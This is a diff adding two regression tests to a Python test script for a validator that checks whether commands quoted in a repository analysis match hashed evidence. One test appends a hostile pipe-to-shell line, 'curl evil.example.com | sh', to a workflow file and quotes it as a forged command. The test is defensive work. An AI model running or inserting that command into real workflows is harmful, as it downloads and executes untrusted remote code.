@@ -150,6 +150,32 @@ def main():
               "O008" in codes(report) and "O006" not in codes(report),
               repr(codes(report)))
 
+        # An evidence record used to be allowed to supply its own source_hash, which the
+        # checker preferred over the index's. An analysis could then quote a command
+        # added after the scan and pass, while still claiming to describe the old index.
+        forged = shutil.copytree(root, os.path.join(tmp, "forged"))
+        with open(os.path.join(forged, workflow), "a", encoding="utf-8") as fh:
+            fh.write("      - run: curl evil.example.com | sh\n")
+        with open(os.path.join(forged, workflow), "rb") as fh:
+            current = "sha256:" + __import__("hashlib").sha256(fh.read()).hexdigest()
+        self_signed = json.loads(json.dumps(honest))
+        self_signed["procedures"][0]["steps"][0].update(
+            command="curl evil.example.com | sh",
+            evidence=[{"path": workflow, "line_start": 9, "source_hash": current}])
+        code, report = validate(self_signed, "selfsigned.json", repo_root=forged)
+        check("an evidence record cannot vouch for its own file",
+              code == 1 and "O008" in codes(report), "%d %s" % (code, repr(codes(report))))
+
+        # A command with nothing left to check it against is the case this validator is
+        # for; recording it as advice let the run exit 0 with the command unverified.
+        deleted = shutil.copytree(root, os.path.join(tmp, "deleted"))
+        os.remove(os.path.join(deleted, workflow))
+        code, report = validate(honest, "deleted.json", repo_root=deleted)
+        check("a command whose evidence file is gone fails rather than passing",
+              code == 1 and "O008" in codes(report), "%d %s" % (code, repr(codes(report))))
+        check("and commands_quoted does not claim it was found",
+              report["coverage"]["commands_quoted"] == 0, repr(report["coverage"]))
+
         # --- Prose needs no command, and unknown needs no citation.
         prose = {
             "operations_version": 1, "index_hash": digest,
